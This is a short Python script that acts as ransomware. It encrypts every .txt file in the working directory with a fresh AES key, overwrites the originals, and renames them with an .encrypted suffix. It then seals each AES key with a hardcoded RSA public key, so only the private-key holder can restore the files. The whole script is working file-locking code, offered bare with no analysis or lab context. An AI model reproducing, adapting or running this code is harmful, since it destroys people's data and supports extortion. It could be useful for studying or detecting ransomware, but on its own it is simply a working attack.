import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

files = [file for file in os.listdir() if file.endswith(".txt")]

pk_str = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyTAVm/wXDvUR6BNTS8Fl
/siCklVjpDouqhpR1WJCsG1tjfv0VZL4AsQF4QY/DkHYQNU4CRElZ+OyUdG531h6
310wUYrWy6YZMPrylFfjCoL1SdGVPc7TdglWmdGu+/48/a+g6/Fkccxsv/c3NY7H
IgDLBqEEMNFC1ARu5D21z/q0rzARbt/yzXk8F7yNs54FW0d3wdElIGGCUb4Z2JYL
KHGxJzQoUCznw41HuhSyk7HFK+7K+r3IN/LaO/8qDvKBu9NVwYrFF0isD/86R7B8
U2eCv2S7p4B0G7ZElgYOtZQC+1kfGlWWpInB6EQhJ33i8zDm2/9nh5IIKKMqdW59
vwIDAQAB
-----END PUBLIC KEY-----"""
pk = RSA.importKey(pk_str)

for file in files:
    with open(file, 'rb') as f:
        pt = f.read()

    AES_key = get_random_bytes(AES.block_size)
    cipher = AES.new(AES_key, AES.MODE_CBC)
    iv = cipher.iv
    ct = cipher.encrypt(pad(pt, AES.block_size))

    with open(file,"wb") as f:
        f.write(iv)
        f.write(ct)
    os.rename(file, file + '.encrypted')

    enc = PKCS1_OAEP.new(pk).encrypt(AES_key)

    with open(file + '.ID', "wb") as f:
        f.write(enc)

    with open(file + '.note', "wb") as f:
        f.write(enc)